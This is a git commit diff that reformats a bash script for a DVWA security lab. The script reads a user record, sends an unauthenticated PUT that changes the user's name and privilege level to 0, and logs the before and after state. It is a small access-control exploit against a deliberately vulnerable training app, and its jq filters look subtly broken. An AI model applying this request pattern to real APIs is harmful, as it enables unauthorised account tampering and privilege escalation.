11c77349544d7397f32d083521708780864702f8
Wiktoria Blomgren Strandberg <102546496+wikblo-0@users.noreply.github.com>
2026-03-24 21:23:50 +0100

    Refactor shell script for user modification logging

--- shell_script_for_medium_security_level.sh
+++ shell_script_for_medium_security_level.sh
@@ -1,18 +1,21 @@
 #!/bin/bash
 
-( echo "=== BEFORE ===" curl -s \
+( echo "=== BEFORE ==="
+curl -s \
 http://192.168.56.105/DVWA/vulnerabilities/api/v2/user/2 \
 | jq -r '"ID:(.id) Name:(.name) Level:(.level)"'
 echo ""
 
-echo "=== MODIFYING USER ===" curl -s -X PUT \
+echo "=== MODIFYING USER ==="
+curl -s -X PUT \
 http://192.168.56.105/DVWA/vulnerabilities/api/v2/user/2 \
 -H "Content-Type: application/json" \
 -d '{"name":"morph","level":0}' \
 | jq -r '"UPDATED -> ID:(.id) Name:(.name) Level:(.level)"'
 echo ""
 
-echo "=== AFTER ===" curl -s \
+echo "=== AFTER ==="
+curl -s \
 http://192.168.56.105/DVWA/vulnerabilities/api/v2/user/2 \
 | jq -r '"ID:(.id) Name:(.name) Level:(.level)"'
 ) > /home/kali/api_medium.log
